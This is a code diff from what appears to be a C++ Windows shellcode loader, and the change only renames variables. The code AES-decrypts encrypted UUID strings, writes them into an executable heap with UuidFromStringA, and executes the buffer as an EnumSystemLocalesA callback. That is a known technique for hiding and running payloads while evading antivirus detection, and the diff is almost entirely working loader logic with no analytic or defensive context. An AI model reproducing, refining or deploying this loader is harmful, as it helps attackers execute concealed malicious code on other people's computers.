@@ -59,18 +59,18 @@ int main()
 		return -1;
 	}  
 	   
-	HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
-    void* ha = nullptr;
-	if (hc)
-        ha = HeapAlloc(hc, 0, 0x100000);
-    DWORD_PTR hptr = (DWORD_PTR)ha;
+	HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
+    void* pvBuf = nullptr;
+	if (hHeap)
+        pvBuf = HeapAlloc(hHeap, 0, 0x100000);
+    DWORD_PTR pdwBuf = (DWORD_PTR)pvBuf;
 	
-    int elems = sizeof(encryptedUuids) / sizeof(encryptedUuids[0]);
+    int iElems = sizeof(encryptedUuids) / sizeof(encryptedUuids[0]);
 
     CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption dec;
     dec.SetKeyWithIV(key, sizeof(key), iv, sizeof(iv));
 	
-    for (int i = 0; i < elems; i++) 
+    for (int i = 0; i < iElems; i++) 
     {
 	    std::string recoveredUuid;
     	CryptoPP::ArraySource s(
@@ -88,29 +88,29 @@ int main()
 #endif
 
     	// todo: xor uuid
-        RPC_STATUS status = fUuidFromStringA((RPC_CSTR)recoveredUuid.c_str(), (UUID*)hptr);
+        RPC_STATUS status = fUuidFromStringA((RPC_CSTR)recoveredUuid.c_str(), (UUID*)pdwBuf);
         if (status != RPC_S_OK) {
 #ifdef _DEBUG
             printf("[-] UuidFromStringA() != S_OK\n");
 #endif
-            if (ha)
-				fCloseHandle(ha);
+            if (pvBuf)
+				fCloseHandle(pvBuf);
             return -1;
         }
-        hptr += 16;
+        pdwBuf += 16;
     }
 	
 #ifdef _DEBUG
     printf("[*] Hexdump: ");
-    for (int i = 0; i < elems * 16; i++) {
-        printf("%02X ", ((unsigned char*)ha)[i]);
+    for (int i = 0; i < iElems * 16; i++) {
+        printf("%02X ", ((unsigned char*)pvBuf)[i]);
     }
 #endif
 
-	if (ha)
+	if (pvBuf)
 	{
-		fEnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
-        fCloseHandle(ha);
+		fEnumSystemLocalesA((LOCALE_ENUMPROCA)pvBuf, 0);
+        fCloseHandle(pvBuf);
         return 0;
 	}
     return -2;
